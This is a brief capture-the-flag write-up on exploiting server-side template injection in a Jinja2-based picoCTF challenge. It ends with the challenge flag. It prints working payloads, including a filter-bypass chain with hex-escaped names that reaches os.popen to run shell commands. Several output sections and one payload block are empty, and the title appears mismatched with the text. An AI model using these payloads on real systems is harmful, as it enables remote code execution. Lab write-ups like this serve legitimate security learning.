# SSTI1

by RGX

## Steps
1. Launch instance, wait, and open the website
2. Same like SSTI1, I tried to input different payloads to know which SSTI1 can be injected. Then I found this payload code can be use to inject.
```
{{7*7}}
```

---------------------------

The output


---------------------------

3. So like before it is using Jinja2 or other similar engines for python. I tried using this payload again to see if it is still working.
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag).read() }}
```

The output


---------------------------

4. Aha!, it seems the input now are filtered. Then I did brainstorm and looking for references. At the end I've found this payload.

```

```

The output



5. Then I know it can be injected with RCE. So I use this payload to do the injection

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

6. Yeay we got the flag!
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}
```

